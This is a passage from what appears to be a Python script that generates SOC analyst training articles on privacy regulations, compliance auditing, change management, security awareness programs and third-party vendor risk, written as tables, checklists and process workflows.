         |-> Notify DPO and legal team
Hour 24: Initial assessment should be complete
         |-> Determine if personal data was affected
         |-> Begin documenting breach details
Hour 72: DEADLINE - Notify supervisory authority
         |-> Unless breach is unlikely to result in risk to individuals
         |-> If notifying late, must justify delay
"Without undue delay": Notify affected individuals
         |-> Required when breach is likely to result in HIGH risk
         |-> Must describe breach, likely consequences, measures taken
```

### GDPR Penalties

| Tier | Maximum Fine | Violations |
|------|-------------|------------|
| Lower | 10M EUR or 2% global annual turnover | Record keeping, DPIA, DPO violations |
| Upper | 20M EUR or 4% global annual turnover | Consent, data subject rights, cross-border transfers |

## CCPA / CPRA (California Consumer Privacy Act / California Privacy Rights Act)

### Scope and Applicability

- **CCPA Effective:** January 1, 2020
- **CPRA Effective:** January 1, 2023 (amended and expanded CCPA)
- **Applies to:** For-profit businesses meeting thresholds that collect CA residents' data
- **Thresholds (any one):** Revenue > $25M, 100K+ consumers' data, 50%+ revenue from selling data

### Key Consumer Rights

| Right | Description | SOC Consideration |
|-------|------------|-------------------|
| Right to Know | What data is collected and how it is used | Audit logging must track data access |
| Right to Delete | Request deletion of personal information | Deletion across all systems including logs |
| Right to Opt-Out | Opt out of sale/sharing of personal info | Respect "Do Not Sell" flags |
| Right to Non-Discrimination | No penalty for exercising rights | Service quality must not change |
| Right to Correct | Correct inaccurate personal information | Correction mechanisms needed |
| Right to Limit Use | Limit use of sensitive personal information | Category-based processing controls |

### CCPA/CPRA Penalties

| Violation Type | Penalty |
|---------------|---------|
| Unintentional | Up to $2,500 per violation |
| Intentional | Up to $7,500 per violation |
| Private right of action (breaches) | $100-$750 per consumer per incident |

## HIPAA (Health Insurance Portability and Accountability Act)

### Scope and Applicability

- **Effective:** April 14, 2003 (Privacy Rule); various dates for other rules
- **Applies to:** Covered entities and their business associates
- **Covered entities:** Health plans, healthcare providers, healthcare clearinghouses
- **Business associates:** Entities handling PHI on behalf of covered entities

### HIPAA Rules

| Rule | Purpose | Key Requirements |
|------|---------|-----------------|
| **Privacy Rule** | Protects PHI | Use/disclosure limits, patient rights, minimum necessary |
| **Security Rule** | Protects ePHI | Administrative, physical, technical safeguards |
| **Breach Notification Rule** | Requires breach reporting | Notification to individuals, HHS, and media |
| **HITECH Act** | Strengthened enforcement | Increased penalties, extended to business associates |

### HIPAA Security Rule Safeguards

| Category | Examples |
|----------|---------|
| **Administrative** | Risk analysis, workforce training, incident procedures, BAAs |
| **Physical** | Facility access controls, workstation security, device controls |
| **Technical** | Access control, audit controls, integrity controls, transmission security |

### HIPAA Breach Notification Requirements

| Breach Size | Notify Individuals | Notify HHS | Notify Media |
|-------------|-------------------|-------------|-------------|
| < 500 individuals | Within 60 days | Annual log (by March 1) | Not required |
| 500+ individuals | Within 60 days | Within 60 days | Within 60 days (state/local media) |

### HIPAA Penalty Tiers

| Tier | Knowledge Level | Per Violation | Annual Maximum |
|------|----------------|---------------|---------------|
| 1 | Did not know | $100 - $50,000 | $25,000 |
| 2 | Reasonable cause | $1,000 - $50,000 | $100,000 |
| 3 | Willful neglect (corrected) | $10,000 - $50,000 | $250,000 |
| 4 | Willful neglect (not corrected) | $50,000 | $1,500,000 |

## Regulation Comparison Table

| Feature | GDPR | CCPA/CPRA | HIPAA |
|---------|------|-----------|-------|
| **Jurisdiction** | EU/EEA (+ extraterritorial) | California (+ extraterritorial) | United States |
| **Data Type** | Personal data | Personal information | PHI (health data) |
| **Sectors** | All | For-profit (with thresholds) | Healthcare |
| **Breach Notification** | 72 hours to authority | "Most expedient time possible" | 60 days to individuals |
| **Max Penalty** | 4% global revenue | $7,500 per violation | $1.5M per violation category/year |
| **Individual Lawsuits** | Yes (member state law) | Yes (data breaches) | No (except state laws) |
| **DPO Required** | Conditional | No (but privacy program needed) | No (but Privacy Officer recommended) |
| **Right to Delete** | Yes | Yes | Limited (amendment right) |
| **Cross-border Rules** | Strict (adequacy, SCCs) | No specific rules | BAA required for business associates |

## SOC Analyst Relevance

### Breach Classification Decision Tree

```
Personal data/PII involved in incident?
  |-- No --> Standard incident; no regulatory notification
  |-- Yes --> Which regulations apply?
       |-- GDPR (EU residents)?
       |     |-- Notify DPO immediately
       |     |-- 72-hour authority notification clock starts
       |-- HIPAA (PHI)?
       |     |-- Notify Privacy Officer immediately
       |     |-- Perform 4-factor risk assessment
       |-- CCPA (CA residents)?
       |     |-- Notify Legal immediately
       |     |-- Assess scope for notification requirements
       |-- Document everything for all applicable regulations
```

### SOC Incident Report Privacy Checklist

- [ ] Identify what types of personal data were affected
- [ ] Determine the number of affected individuals
- [ ] Identify geographic locations of affected individuals
- [ ] Assess whether data was encrypted at time of breach
- [ ] Determine if data was actually accessed vs. just exposed
- [ ] Document timeline of breach (start, detection, containment)
- [ ] Notify legal/privacy team with initial assessment within 1 hour
- [ ] Preserve evidence while respecting privacy handling requirements
- [ ] Do NOT include actual personal data in incident tickets or reports

## Key Takeaways

- Multiple privacy regulations may apply simultaneously to a single breach
- Breach notification timelines are short; rapid SOC detection and classification is critical
- GDPR has the broadest reach (extraterritorial) and largest penalties (4% global revenue)
- HIPAA has specific technical safeguard requirements that SOC teams must understand
- Always notify legal and privacy teams immediately when personal data is involved
- Document everything but never include actual personal data in incident reports
"""
    ))

    # ------------------------------------------------------------------
    # Article 8: Compliance Auditing and Evidence Collection
    # ------------------------------------------------------------------
    articles.append((
        "Compliance Auditing and Evidence Collection",
        ["governance", "compliance", "auditing", "evidence-collection", "audit", "controls"],
        r"""# Compliance Auditing and Evidence Collection

## Overview

Compliance auditing verifies that an organization meets its regulatory, legal, and policy
requirements. SOC teams are frequently asked to provide evidence of security controls,
monitoring effectiveness, and incident response capabilities. Understanding the audit
process helps you prepare and respond efficiently.

## Audit Types

| Audit Type | Conducted By | Purpose | Examples |
|-----------|-------------|---------|---------|
| **Internal** | Organization's own audit team | Self-assessment and improvement | Annual security control review |
| **External** | Independent third party | Independent assurance | SOC 2 Type II, ISO 27001 certification |
| **Regulatory** | Government or regulatory body | Compliance verification | HIPAA OCR audit, PCI QSA assessment |
| **Supplier** | Customer auditing a vendor | Vendor risk assessment | Right-to-audit clause exercise |
| **Forensic** | Specialized investigators | Post-incident investigation | Breach investigation, fraud examination |

### SOC 2 Report Types

| Type | Description | Period | Best For |
|------|-----------|--------|----------|
| **Type I** | Controls are suitably designed at a point in time | Single date | New programs, initial assessment |
| **Type II** | Controls are operating effectively over a period | 6-12 months | Ongoing assurance, mature programs |

### SOC 2 Trust Service Criteria

| Criterion | Focus | SOC Team Evidence |
|-----------|-------|-------------------|
| Security | Protection against unauthorized access | Access controls, monitoring, IR |
| Availability | System availability for operation | Uptime monitoring, DR testing |
| Processing Integrity | Accurate and complete processing | Data validation, error handling |
| Confidentiality | Protection of confidential information | Encryption, access controls, DLP |
| Privacy | Personal information handling | Privacy controls, consent management |

## Audit Preparation

### Pre-Audit Checklist

- [ ] Identify audit scope and applicable controls
- [ ] Assign evidence owners for each control
- [ ] Gather evidence before the auditor requests it
- [ ] Review previous audit findings and verify remediation
- [ ] Ensure all policies are current and approved
- [ ] Verify system configurations match documented standards
- [ ] Prepare a list of key contacts for auditor interviews
- [ ] Reserve a workspace for the audit team
- [ ] Brief all team members on audit expectations
- [ ] Review and test backup and recovery procedures

### Evidence Organization

Create a structured evidence repository:

```
/Audit-2026-Q1/
  /01-Policies/
    - Information-Security-Policy-v3.2.pdf
    - Access-Control-Policy-v2.1.pdf
    - Incident-Response-Plan-v4.0.pdf
  /02-Access-Controls/
    - User-Access-Review-Q4-2025.xlsx
    - MFA-Enrollment-Report.pdf
    - Privileged-Account-Inventory.xlsx
  /03-Monitoring/
    - SIEM-Alert-Rules-List.pdf
    - Sample-Alert-Investigation-Reports/
    - SOC-Metrics-Dashboard-Screenshot.png
  /04-Incident-Response/
    - IR-Tabletop-Exercise-Report.pdf
    - Sample-Incident-Reports/
    - IR-Metrics-2025.xlsx
  /05-Change-Management/
    - Change-Advisory-Board-Minutes.pdf
    - Sample-Change-Requests/
    - Emergency-Change-Log.xlsx
```

## Evidence Collection Best Practices

### Types of Audit Evidence

| Evidence Type | Description | Strength | Examples |
|--------------|------------|----------|---------|
| **Documentary** | Written records and documents | Strong | Policies, procedures, logs, reports |
| **Testimonial** | Verbal statements from interviews | Moderate | Staff interviews, process walkthroughs |
| **Observational** | Direct observation of processes | Strong | Watching an analyst triage an alert |
| **Analytical** | Analysis of data and trends | Strong | Metrics dashboards, trend reports |
| **System-generated** | Automated output from systems | Very Strong | Audit logs, configuration exports |

### Evidence Quality Criteria

| Criterion | Description | Example |
|-----------|------------|---------|
| **Relevant** | Directly addresses the control requirement | MFA logs for access control audit |
| **Reliable** | From a trustworthy, tamper-resistant source | System-generated logs, not screenshots |
| **Complete** | Covers the full audit period | 12 months of access reviews, not just one |
| **Timely** | Current and within the audit period | Configurations from this quarter, not last year |
| **Sufficient** | Enough to support the conclusion | Multiple samples, not just one example |

### Common Evidence Requests from Auditors

| Control Area | Typical Evidence Requested |
|-------------|---------------------------|
| Access management | User lists, role assignments, access reviews, termination procedures |
| Monitoring | SIEM rules, alert volumes, investigation samples, escalation records |
| Incident response | IR plan, incident reports, tabletop exercise records, metrics |
| Change management | CAB meeting minutes, change requests, approval workflows |
| Vulnerability management | Scan results, remediation timelines, exception approvals |
| Backup and recovery | Backup logs, recovery test results, RPO/RTO documentation |
| Training | Training completion records, phishing simulation results |
| Encryption | Encryption configurations, key management procedures, certificate inventory |

## Control Testing

### Testing Methods

| Method | Description | When Used |
|--------|------------|-----------|
| **Inquiry** | Ask personnel about control operation | Understanding processes |
| **Inspection** | Examine documents and records | Verifying documentation exists |
| **Observation** | Watch the control in operation | Verifying process is followed |
| **Re-performance** | Independently execute the control | Verifying control effectiveness |

### Sample Testing

Auditors typically test a sample, not every instance:

| Population Size | Typical Sample Size | Example |
|----------------|--------------------|---------|
| 1-5 | All | 3 privileged accounts: test all 3 |
| 6-50 | 5-10 | 30 change requests: test 8 |
| 51-250 | 10-25 | 150 access reviews: test 20 |
| 251-500 | 25-30 | 400 incidents: test 25 |
| 500+ | 30-60 | 2000 alerts: test 45 |

## Audit Findings and Remediation

### Finding Severity Levels

| Level | Description | Remediation Timeline |
|-------|------------|---------------------|
| **Critical** | Control failure with immediate risk | Immediate (24-72 hours) |
| **High** | Significant control weakness | 30 days |
| **Medium** | Moderate gap in control design or operation | 60-90 days |
| **Low** | Minor improvement opportunity | 180 days |
| **Informational** | Best practice recommendation | Next review cycle |

### Remediation Plan Template

| Finding ID | Description | Severity | Root Cause | Remediation Action | Owner | Target Date | Status |
|-----------|------------|----------|-----------|-------------------|-------|-------------|--------|
| F-2026-001 | MFA not enforced for VPN | High | Configuration gap | Enable MFA on VPN gateway | IT Security | 2026-03-15 | In Progress |
| F-2026-002 | No access review for Q3 | Medium | Staff turnover | Conduct review, assign backup | IAM Team | 2026-03-30 | Planned |

## Continuous Compliance Monitoring

### Moving Beyond Point-in-Time Audits

| Approach | Description | Tools |
|----------|------------|-------|
| Continuous Control Monitoring | Automated testing of controls | GRC platforms, SIEM rules |
| Automated Evidence Collection | System-generated evidence gathering | API integrations, scheduled reports |
| Real-time Dashboards | Live compliance status visibility | GRC dashboards, SIEM dashboards |
| Exception Tracking | Automated tracking of control exceptions | Ticketing systems, GRC tools |

### SOC Contribution to Continuous Compliance

- [ ] Configure SIEM rules that map to audit controls
- [ ] Generate automated reports for common evidence requests
- [ ] Maintain incident metrics that demonstrate control effectiveness
- [ ] Document all process changes that affect auditable controls
- [ ] Set calendar reminders for periodic control activities (access reviews, etc.)
- [ ] Build dashboards showing control health metrics

## SOC-Specific Audit Preparation

### Evidence the SOC Should Always Have Ready

| Category | Evidence | Format | Retention |
|----------|---------|--------|-----------|
| Monitoring | Active detection rules list with descriptions | Export/PDF | Current |
| Monitoring | Alert volume and disposition metrics | Dashboard/Report | 12+ months |
| Incident Response | Sample incident reports (redacted) | PDF | 12+ months |
| Incident Response | IR plan and playbooks | Document | Current version |
| Incident Response | Tabletop exercise reports | Document | Last 2 exercises |
| Access Control | SOC tool access reviews | Spreadsheet | Last 4 quarters |
| Training | SOC analyst training records | Spreadsheet | Current year |
| Change Management | Detection rule change log | System export | 12+ months |

## Key Takeaways

- Audit preparation is ongoing, not a last-minute scramble
- System-generated evidence is stronger than screenshots or verbal explanations
- Organize evidence by control area before the auditor asks for it
- Track remediation of findings to closure; open findings compound over time
- Continuous compliance monitoring reduces audit burden and improves security
- SOC teams provide critical evidence for security monitoring and IR controls
"""
    ))

    # ------------------------------------------------------------------
    # Article 9: Change Management and Configuration Control
    # ------------------------------------------------------------------
    articles.append((
        "Change Management and Configuration Control",
        ["governance", "risk", "change-management", "configuration-control", "itil"],
        r"""# Change Management and Configuration Control

## Overview

Change management is a structured process for controlling modifications to IT systems,
applications, and infrastructure. For SOC analysts, unauthorized or poorly managed changes
are a leading cause of security incidents and outages. Understanding change management helps
you distinguish between legitimate changes and potential threats.

## Why Change Management Matters for Security

| Uncontrolled Change | Security Consequence | Real-World Example |
|--------------------|--------------------|-------------------|
| Firewall rule added without review | Exposed internal services | Admin opens port 3389 for "quick testing" |
| Server patch applied without testing | System outage or new vulnerability | Patch breaks authentication service |
| Application deployed without scan | Vulnerable code in production | Developer bypasses CI/CD security checks |
| Configuration changed without docs | Drift from secure baseline | Cloud storage bucket made public |
| Account created without approval | Unauthorized access | Contractor given admin rights by mistake |

**Key statistic:** Industry data consistently shows that 60-80% of outages are caused by
poorly managed changes, not by external attacks.

## Change Types

| Type | Description | Approval | Risk | Example |
|------|-----------|----------|------|---------|
| **Standard** | Pre-approved, low-risk, routine | Pre-authorized | Low | Password reset, user onboarding |
| **Normal** | Planned change requiring review | CAB approval | Medium-High | Server upgrade, firewall rule change |
| **Emergency** | Urgent fix for critical issue | Expedited approval | Variable | Security patch for active exploit |

### Standard Change Catalog Examples

| Change | Pre-Approved Conditions | Auto-Approval |
|--------|------------------------|---------------|
| New user account | HR-approved hire, standard role | Yes |
| Password reset | Identity verified, ticket logged | Yes |
| Firewall rule (outbound) | Approved destination list | Yes |
| Software install (approved list) | On approved software list | Yes |
| Disk space increase | Within pre-set thresholds | Yes |

## Change Advisory Board (CAB)

### CAB Structure

| Role | Responsibility | Attendance |
|------|---------------|-----------|
| CAB Chair | Facilitate meetings, final approval authority | Every meeting |
| Change Manager | Present changes, track outcomes | Every meeting |
| Security Representative | Assess security impact | Every meeting |
| IT Operations | Assess operational impact | Every meeting |
| Application Owners | Assess application impact | When their apps are affected |
| Network Team | Assess network impact | When network changes proposed |
| Business Representative | Assess business impact | Major changes |

### CAB Meeting Agenda

1. Review outstanding action items from previous meeting
2. Review emergency changes executed since last meeting
3. Post-implementation review of completed changes
4. Review and approve/reject pending change requests
5. Assess upcoming change schedule for conflicts
6. Review change metrics and trends

## Request for Change (RFC) Process

### RFC Workflow

```
Requester submits RFC
  |-> Change Manager reviews for completeness
  |-> Impact and risk assessment performed
  |-> Is it a standard change?
  |    |-- Yes --> Auto-approve, schedule
  |    |-- No --> Submit to CAB
  |         |-> CAB reviews and decides
  |              |-- Approved --> Schedule implementation
  |              |-- Rejected --> Return with feedback
  |              |-- Deferred --> Reschedule review
  |-> Implementation performed
  |-> Post-implementation testing
  |-> Change closed
  |    |-- Successful --> Document and close
  |    |-- Failed --> Initiate rollback
```

### RFC Template

| Field | Description | Example |
|-------|-----------|---------|
| Change ID | Unique identifier | CHG-2026-0342 |
| Requester | Person submitting the change | Jane Smith, Network Team |
| Description | What is being changed | Update firewall rules for new application |
| Justification | Why the change is needed | New CRM application requires HTTPS access |
| Risk Assessment | Potential impact of the change | Medium - could affect other web traffic |
| Impact Analysis | Systems and users affected | All users accessing external web services |
| Rollback Plan | How to reverse the change | Restore previous firewall configuration backup |
| Test Plan | How to verify success | Verify CRM connectivity, test existing web access |
| Implementation Window | When the change will occur | Saturday 02:00-04:00 UTC |
| Approvals Required | Who must approve | CAB Chair, Security, Network Lead |

## Rollback Planning

### Every Change Must Have a Rollback Plan

| Component | Details | Verification |
|-----------|---------|-------------|
| Pre-change backup | Configuration/data backed up before change | Verify backup is complete and accessible |
| Rollback steps | Step-by-step reversal procedure | Documented and tested |
| Rollback criteria | When to decide to roll back | Defined metrics or failure conditions |
| Rollback time estimate | How long rollback will take | Must fit within maintenance window |
| Rollback owner | Who executes the rollback | Named individual with access |
| Post-rollback testing | How to verify original state restored | Test plan for original functionality |

### Rollback Decision Criteria

```
Change implemented
  |-> Run post-implementation tests
  |-> All tests pass?
  |    |-- Yes --> Monitor for 30 minutes, then close
  |    |-- No --> Can issues be fixed within window?
  |         |-- Yes --> Fix and retest
  |         |-- No --> ROLLBACK
  |              |-> Execute rollback steps
  |              |-> Verify original state restored
  |              |-> Document failure for post-mortem
  |              |-> Schedule new change window
```

## Unauthorized Change Detection

### What SOC Analysts Should Monitor

| Detection Method | What It Catches | Tools |
|-----------------|----------------|-------|
| File Integrity Monitoring (FIM) | Unauthorized file/config changes | OSSEC, Tripwire, Wazuh |
| Configuration Management DB | Drift from approved state | CMDB, Ansible, Puppet |
| Change log correlation | Changes without matching RFC | SIEM + ITSM integration |
| Baseline comparison | Deviation from secure baseline | CIS-CAT, vulnerability scanners |
| Privileged session monitoring | Unscheduled admin activity | PAM tools, session recording |
| Cloud configuration monitoring | Cloud resource changes | AWS Config, Azure Policy, CSPM |

### SIEM Correlation for Unauthorized Changes

```
Rule: Unauthorized Configuration Change
Condition:
  - FIM alert fires for critical system files
  AND
  - No approved change window is active for that system
  AND
  - Change was not performed by authorized change account
Action:
  - Create P2 incident
  - Notify change management and system owner
  - Preserve evidence (before/after state)
```

### Unauthorized Change Investigation Checklist

- [ ] What was changed? (file, configuration, account, etc.)
- [ ] When was the change made? (exact timestamp)
- [ ] Who made the change? (account, source IP)
- [ ] Was there an approved RFC for this change?
- [ ] Was the change within an approved maintenance window?
- [ ] Is the change account authorized for this type of change?
- [ ] What was the previous state? (baseline comparison)
- [ ] Does the change introduce a security risk?
- [ ] Should the change be rolled back immediately?
- [ ] Does this require an incident report?

## Configuration Control

### Configuration Baseline Management

| Activity | Frequency | Responsibility |
|----------|-----------|---------------|
| Establish initial baselines | At system deployment | Security + IT Ops |
| Review and update baselines | Quarterly | Security Engineering |
| Scan for configuration drift | Weekly (automated) | Security Operations |
| Remediate drift | Within SLA of detection | IT Operations |
| Document exceptions | As needed | Change Management |

### Configuration Items to Track

| Category | Configuration Items | Baseline Source |
|----------|-------------------|----------------|
| Operating Systems | Services, users, permissions, patches | CIS Benchmarks |
| Network Devices | ACLs, routing, protocols, firmware | Vendor hardening guides |
| Applications | Settings, integrations, modules | Vendor + internal standards |
| Cloud Resources | IAM, storage, network, encryption | CSP security benchmarks |
| Security Tools | Rules, policies, exclusions | Internal standards |
| Databases | Users, permissions, encryption, auditing | CIS Benchmarks |

## Change Management Metrics

| Metric | Formula | Target |
|--------|---------|--------|
| Change success rate | Successful changes / Total changes | > 95% |
| Emergency change rate | Emergency changes / Total changes | < 10% |
| Unauthorized change rate | Unauthorized changes detected / Total changes | 0% (goal) |
| Mean time to implement | Average time from approval to completion | Depends on type |
| Change-related incidents | Incidents caused by changes / Total changes | < 5% |
| Rollback rate | Rolled-back changes / Total changes | < 5% |

## Key Takeaways

- Most outages come from poor change management, not external attacks
- Every change needs an owner, approval, test plan, and rollback plan
- Standard changes streamline low-risk, routine modifications
- SOC analysts should correlate detected changes against approved RFCs
- File integrity monitoring is a critical detection mechanism for unauthorized changes
- Emergency changes still require documentation, just with expedited approval
"""
    ))

    # ------------------------------------------------------------------
    # Article 10: Security Awareness Training Programs
    # ------------------------------------------------------------------
    articles.append((
        "Security Awareness Training Programs",
        ["governance", "compliance", "security-awareness", "training", "phishing", "security-culture"],
        r"""# Security Awareness Training Programs

## Overview

Security awareness training transforms employees from potential attack vectors into active
defenders. SOC analysts see the direct impact of training effectiveness through phishing
report rates, social engineering success rates, and security incident trends. Effective
training programs reduce the volume and severity of human-caused security events.

## Why Training Matters

### The Human Factor in Numbers

| Statistic | Implication |
|-----------|-------------|
| 82% of breaches involve the human element | Technical controls alone are insufficient |
| Average phishing click rate (untrained): 25-35% | 1 in 3 employees will click without training |
| Average phishing click rate (trained): 3-5% | Training reduces clicks by 80-90% |
| 95% of cybersecurity incidents involve human error | Awareness directly reduces incident volume |
| Social engineering is the top initial access vector | Employees are the primary target |

### SOC Impact of Good vs. Poor Training

| Metric | Poor Training | Good Training |
|--------|-------------|---------------|
| Phishing reports from users | Low | High (early detection source) |
| Credential compromise incidents | Frequent | Rare |
| Social engineering success | High | Low |
| Policy violation alerts | High volume | Manageable volume |
| User-caused malware infections | Frequent | Occasional |
| Time to detect social engineering | Long (no reports) | Short (users report) |

## Phishing Simulation Programs

### Building an Effective Phishing Program

| Phase | Activity | Duration |
|-------|----------|---------|
| 1. Baseline | Run initial simulation with no prior training | Month 1 |
| 2. Training | Deliver targeted training based on baseline results | Month 2 |
| 3. Testing | Run second simulation to measure improvement | Month 3 |
| 4. Ongoing | Monthly simulations with varied difficulty | Ongoing |
| 5. Advanced | Targeted campaigns for high-risk roles | Quarterly |

### Phishing Simulation Difficulty Levels

| Level | Characteristics | Click Rate Target |
|-------|----------------|-------------------|
| **Easy** | Obvious red flags, unknown sender, poor grammar | < 5% |
| **Medium** | Plausible scenario, minor red flags, generic branding | < 10% |
| **Hard** | Realistic scenario, good branding, contextual content | < 15% |
| **Expert** | Targeted spear-phishing, personalized, timely context | < 20% |

### Simulation Campaign Types

| Type | Description | Example |
|------|-----------|---------|
| Credential harvest | Fake login page to capture credentials | "Your password expires today" |
| Malicious attachment | Email with attachment (tracking pixel) | "Invoice attached for review" |
| Link click | Track who clicks a suspicious link | "Click to view shared document" |
| Data entry | Form requesting sensitive information | "HR benefits enrollment update" |
| Multi-vector | Combines email + phone or SMS | Phishing email followed by vishing call |

### Handling Simulation Results

| Outcome | Action | Tone |
|---------|--------|------|
| Clicked link | Immediate training redirect page | Educational, not punitive |
| Entered credentials | Additional focused training module | Supportive, explain risks |
| Reported phishing | Recognition and positive reinforcement | Celebratory |
| Ignored email | No action needed | -- |
| Repeated failures | One-on-one coaching session | Private, constructive |

## Training Topics

### Core Training Modules (All Employees)

| Module | Frequency | Duration | Content |
|--------|-----------|---------|---------|
| Phishing awareness | Quarterly | 15 min | Identifying phishing, reporting process |
| Password security | Annually | 10 min | Strong passwords, MFA, password managers |
| Social engineering | Annually | 20 min | Pretexting, vishing, tailgating |
| Data handling | Annually | 15 min | Classification, secure sharing, disposal |
| Physical security | Annually | 10 min | Clean desk, badge access, visitor policy |
| Incident reporting | Annually | 10 min | What to report, how to report, who to call |
| Remote work security | Annually | 15 min | VPN, public WiFi, home office security |
| Acceptable use | At hire + annually | 15 min | Policy review and acknowledgment |

### Role-Based Training

| Role | Additional Topics | Frequency |
|------|------------------|-----------|
| **Executives** | BEC awareness, targeted attacks, risk decisions | Quarterly |
| **IT Administrators** | Privilege management, secure configuration, supply chain | Semi-annually |
| **Developers** | Secure coding, OWASP Top 10, code review | Semi-annually |
| **Finance** | BEC/wire fraud, invoice fraud, payment verification | Quarterly |
| **HR** | PII handling, social engineering, insider threats | Semi-annually |
| **Customer Service** | Social engineering via phone, data verification | Quarterly |
| **New Hires** | Security onboarding, all core modules | At hire |

## Measuring Training Effectiveness

### Key Metrics

| Metric | How to Measure | Target |
|--------|---------------|--------|
| Phishing click rate | Simulation results | < 5% (mature program) |
| Phishing report rate | Reports to SOC/phishing mailbox | > 70% of simulations reported |
| Training completion rate | LMS tracking | > 95% within deadline |
| Time to report | Time from simulation send to first report | < 1 hour |
| Repeat clickers | Users clicking on 2+ simulations | < 2% of workforce |
| Security incident trend | Incidents caused by human error | Decreasing quarter-over-quarter |
| Knowledge assessment scores | Pre/post training quiz scores | > 80% average |

### Maturity Model for Security Awareness

| Level | Name | Characteristics |
|-------|------|----------------|
| 1 | Non-existent | No formal program |
| 2 | Compliance-focused | Annual checkbox training for compliance |
| 3 | Awareness | Regular training, phishing simulations |
| 4 | Behavior change | Measurable improvement in security behaviors |
| 5 | Culture | Security is part of organizational DNA |

## Building a Security Culture

### Culture-Building Activities

| Activity | Effort | Impact |
|----------|--------|--------|
| Security champions program | Medium | High (peer influence) |
| Monthly security newsletter | Low | Medium (continuous awareness) |
| Gamification and rewards | Medium | High (positive reinforcement) |
| Security awareness month events | High | Medium (annual boost) |
| Lunch-and-learn sessions | Low | Medium (voluntary engagement) |
| Visible leadership support | Low | Very High (tone from the top) |
| Public recognition for good behavior | Low | High (positive reinforcement) |
| Incident stories (anonymized) | Low | High (real-world relevance) |

### Security Champions Program

```
Selection:
  - Volunteer from each department
  - Interest in security, respected by peers

Responsibilities:
  - Attend monthly security briefing
  - Share security updates with their team
  - Serve as first point of contact for security questions
  - Report potential security issues
  - Provide feedback on training effectiveness

Benefits:
  - Special training and certifications
  - Recognition in company communications
  - Career development opportunity
  - Direct relationship with security team
```

## Compliance Requirements for Training

| Regulation/Standard | Training Requirement | Frequency |
|--------------------|---------------------|-----------|
| HIPAA | Security awareness for all workforce members | Annual minimum |
| PCI DSS | Security awareness for all personnel | Annual + at hire |
| SOX | IT controls awareness for relevant staff | Annual |
| GDPR | Data protection training for data handlers | Regular (not specified) |
| NIST CSF | Awareness and training (PR.AT) | Risk-based |
| ISO 27001 | Competence and awareness (7.2, 7.3) | Ongoing |
| CMMC | Security awareness (AT.L2-3.2.1) | Annual minimum |
| State privacy laws | Varies by jurisdiction | Varies |

## SOC Analyst Role in Training

### How SOC Teams Support Training Programs

- [ ] Analyze phishing simulation results to identify trends
- [ ] Provide real-world examples (anonymized) for training content
- [ ] Monitor phishing report mailbox and provide feedback to reporters
- [ ] Track metrics on user-reported incidents vs. detected incidents
- [ ] Identify departments or roles with highest risk for targeted training
- [ ] Participate as subject matter experts in training development
- [ ] Present at lunch-and-learn sessions on current threats
- [ ] Validate that training reduces alert volume from human-caused events

### Phishing Report Workflow

```
User reports suspicious email
  |-> Email received in phishing mailbox
  |-> SOC analyst reviews within SLA (1 hour recommended)
  |-> Determine: phishing simulation or real threat?
  |    |-- Simulation --> Log, send positive feedback to reporter
  |    |-- Real phishing --> Initiate phishing response playbook
  |    |-- Legitimate email --> Inform user, release if quarantined
  |-> Update metrics dashboard
  |-> If widespread campaign --> Alert all users
```

## Key Takeaways

- Security awareness training is a control, not just a compliance checkbox
- Phishing simulations must be regular, varied, and progressive in difficulty
- Measure behavior change, not just training completion
- Positive reinforcement drives better outcomes than punishment
- Role-based training addresses the specific risks each group faces
- SOC analysts are both consumers and contributors to the training program
- A strong security culture makes every employee part of the detection team
"""
    ))

    # ------------------------------------------------------------------
    # Article 11: Third-Party Risk Management and Vendor Security
    # ------------------------------------------------------------------
    articles.append((
        "Third-Party Risk Management and Vendor Security",
        ["governance", "risk", "third-party-risk", "vendor-management", "supply-chain", "tprm"],
        r"""# Third-Party Risk Management and Vendor Security

## Overview

Organizations depend on hundreds of vendors, suppliers, and service providers who may have
access to sensitive systems and data. Third-party risk management (TPRM) ensures that these
relationships do not introduce unacceptable security risk. SOC analysts encounter vendor-related
risks through supply chain attacks, compromised integrations, and vendor-caused incidents.

## Vendor Risk Assessment

### Risk Assessment Process

```
1. Vendor Identification
   |-> Inventory all vendors with system or data access
   |-> Categorize by criticality and data sensitivity

2. Risk Tiering
   |-> Assign risk tier based on access and data handling
   |-> Determines depth of assessment required

3. Assessment
   |-> Questionnaire, documentation review, technical testing
   |-> Review certifications and audit reports

4. Risk Evaluation
   |-> Score risks, identify gaps
   |-> Compare against organizational risk appetite

5. Remediation
   |-> Address identified gaps through contract or controls
   |-> Accept residual risk with documentation

6. Ongoing Monitoring
   |-> Continuous assessment, not just point-in-time
   |-> Reassess periodically based on tier
```

### Vendor Risk Tiering

| Tier | Criteria | Assessment Depth | Reassessment |
|------|---------|-----------------|-------------|
| **Critical** | Access to restricted data, critical systems, or wide network access | Full assessment + on-site review | Annually |
| **High** | Access to confidential data or important systems | Detailed questionnaire + SOC 2 review | Annually |
| **Medium** | Access to internal data or limited systems | Standard questionnaire | Every 2 years |
| **Low** | No data access, no system access | Simplified questionnaire | Every 3 years |

### Tiering Decision Matrix

| Factor | Critical | High | Medium | Low |
|--------|---------|------|--------|-----|
| Data access | Restricted/PII/PHI | Confidential | Internal | Public/None |
| System access | Admin/privileged | User-level | Read-only | None |
| Network access | Internal network | DMZ/API only | SaaS only | None |
| Business dependency | Cannot operate without | Significant impact | Moderate impact | Easily replaced |
| Integration depth | Deep API/data integration | Moderate integration | Light integration | None |

## Security Questionnaires

### Common Questionnaire Frameworks

| Framework | Full Name | Questions | Best For |
|-----------|-----------|-----------|---------|
| **SIG** | Standardized Information Gathering | 800+ (full) / 100+ (lite) | Comprehensive assessment |
| **CAIQ** | Consensus Assessments Initiative Questionnaire | 260+ | Cloud service providers |
| **VSAQ** | Vendor Security Assessment Questionnaire | Custom | Organization-specific needs |
| **HECVAT** | Higher Education CVAT | 200+ | Higher education vendors |

### Key Assessment Areas

| Domain | Key Questions | Evidence to Request |
|--------|-------------|-------------------|
| Governance | Security policies, risk management, compliance | Policy documents, certifications |
| Access Control | Authentication, authorization, privileged access | Access control policy, MFA details |
| Data Protection | Encryption, classification, retention, disposal | Encryption standards, data flow diagrams |
| Incident Response | IR plan, breach notification, communication | IR plan, breach notification SLA |
| Business Continuity | BCP/DR, backup, recovery testing | BCP/DR plans, test results |
| Vulnerability Management | Scanning, patching, penetration testing | Scan/pentest reports (redacted) |
| Personnel | Background checks, training, separation procedures | HR policies, training records |
| Physical Security | Data center security, environmental controls | SOC 2/3 reports, certifications |
| Subcontractors | Fourth-party risk management | Subcontractor list, flow-down requirements |

## SOC 2 Reports

